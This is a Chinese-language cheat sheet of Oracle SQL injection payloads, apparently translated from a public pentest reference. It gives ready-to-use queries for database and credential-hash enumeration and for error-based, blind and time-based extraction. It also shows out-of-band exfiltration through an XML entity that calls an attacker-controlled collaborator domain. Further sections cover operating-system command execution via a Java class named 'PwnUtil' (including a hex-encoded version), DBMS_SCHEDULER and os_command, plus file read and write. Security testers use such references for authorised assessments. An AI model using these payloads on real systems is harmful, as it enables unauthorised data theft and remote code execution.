# Oracle SQL 注入

> Oracle SQL 注入是一种安全漏洞，当攻击者能够将恶意 SQL 代码插入或“注入”到由 Oracle 数据库执行的 SQL 查询中时，就会出现这种漏洞。当用户输入未经过适当过滤或参数化，允许攻击者操纵查询逻辑时，就可能发生这种情况。这可能导致未经授权的访问、数据操纵和其他严重的安全影响。

## 目录

* [Oracle SQL 默认数据库](#oracle-sql-默认数据库)
* [Oracle SQL 注释](#oracle-sql-注释)
* [Oracle SQL 枚举](#oracle-sql-枚举)
* [Oracle SQL 数据库凭据](#oracle-sql-数据库凭据)
* [Oracle SQL 方法论](#oracle-sql-方法论)
    * [Oracle SQL 列出数据库](#oracle-sql-列出数据库)
    * [Oracle SQL 列出表](#oracle-sql-列出表)
    * [Oracle SQL 列出列](#oracle-sql-列出列)
* [Oracle SQL 基于报错](#oracle-sql-基于报错)
* [Oracle SQL 盲注](#oracle-sql-盲注)
    * [等效于子字符串的 Oracle 盲注](#等效于子字符串的-oracle-盲注)
* [Oracle SQL 基于时间](#oracle-sql-基于时间)
* [Oracle SQL 带外注入 (OOB)](#oracle-sql-带外注入-oob)
* [Oracle SQL 命令执行](#oracle-sql-命令执行)
    * [Oracle Java 执行](#oracle-java-执行)
    * [Oracle Java 类](#oracle-java-类)
* [Oracle SQL 文件操作](#oracle-sql-文件操作)
    * [Oracle SQL 读取文件](#oracle-sql-读取文件)
    * [Oracle SQL 写入文件](#oracle-sql-写入文件)
    * [os_command 包](#os_command-包)
    * [DBMS_SCHEDULER 任务](#dbms_scheduler-任务)



## Oracle SQL 默认数据库

| 名称               | 描述               |
|--------------------|---------------------------|
| SYSTEM             | 在所有版本中可用 |
| SYSAUX             | 在所有版本中可用 |

## Oracle SQL 注释

| 类型                | 注释 |
| ------------------- | ------- |
| 单行注释 | `--`    |
| 多行注释  | `/**/`  |

## Oracle SQL 枚举

| 描述   | SQL 查询 |
| ------------- | ------------------------------------------------------------ |
| 数据库管理系统 (DBMS) 版本  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |
| DBMS 版本  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |
| DBMS 版本  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |
| DBMS 版本  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |
| DBMS 版本  | `SELECT version FROM v$instance;`                            |
| 主机名      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |
| 主机名      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |
| 主机名      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |
| 主机名      | `SELECT host_name FROM v$instance;`                          |
| 数据库名称 | `SELECT global_name FROM global_name;`                       |
| 数据库名称 | `SELECT name FROM V$DATABASE;`                               |
| 数据库名称 | `SELECT instance_name FROM V$INSTANCE;`                      |
| 数据库名称 | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |
| 数据库名称 | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |

## Oracle SQL 数据库凭据

| 查询                                   | 描述               |
|-----------------------------------------|---------------------------|
| `SELECT username FROM all_users;`       | 在所有版本中可用 |
| `SELECT name, password from sys.user$;` | 需要特权，<= 10g        |
| `SELECT name, spare4 from sys.user$;`   | 需要特权，<= 11g        |

## Oracle SQL 方法论

### Oracle SQL 列出数据库

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

### Oracle SQL 列出表

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
```

### Oracle SQL 列出列

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
```

## Oracle SQL 基于报错

| 描述           | 查询          |
| :-------------------- | :------------- |
| 无效的 HTTP 请求  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
| 无效的 XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
| 无效的 XML           | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual` |
| 无效的 XML           | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |
| SQL 错误             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -` |

当注入点在字符串内部时使用：`'||PAYLOAD--`

## Oracle SQL 盲注

| 描述              | 查询          |
| :----------------------- | :------------- |
| 版本是 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
| 启用了子查询    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
| 表 log_table 存在   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
| 表 log_table 中存在 message 列 | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
| 第一条消息的第一个字母是 t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |

### 等效于子字符串的 Oracle 盲注

| 函数    | 示例                                   |
| ----------- | ----------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |

## Oracle SQL 基于时间

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

## Oracle SQL 带外注入 (OOB)

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

## Oracle SQL 命令执行

* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT (Oracle 数据库攻击工具)

### Oracle Java 执行

* 列出 Java 权限

    ```sql
    select * from dba_java_policy
    select * from user_java_policy
    ```

* 授予权限

    ```sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
    ```

* 执行命令
    * 10g R2, 11g R1 和 R2: `DBMS_JAVA_TEST.FUNCALL()`

        ```sql
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
        ```

    * 11g R1 和 R2: `DBMS_JAVA.RUNJAVA()`

        ```sql
        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
        ```

### Oracle Java 类

* 创建 Java 类

    ```sql
    BEGIN
    EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
    END;

    BEGIN
    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
    END;

    -- 十六进制编码的有效载荷
    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual
    ```

* 运行操作系统命令

    ```sql
    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
    ```

### os_command 包

```sql
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
```

### DBMS_SCHEDULER 任务

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```

## Oracle SQL 文件操作

:warning: 仅在堆叠查询 (stacked query) 中有效。

### Oracle SQL 读取文件

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### Oracle SQL 写入文件

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

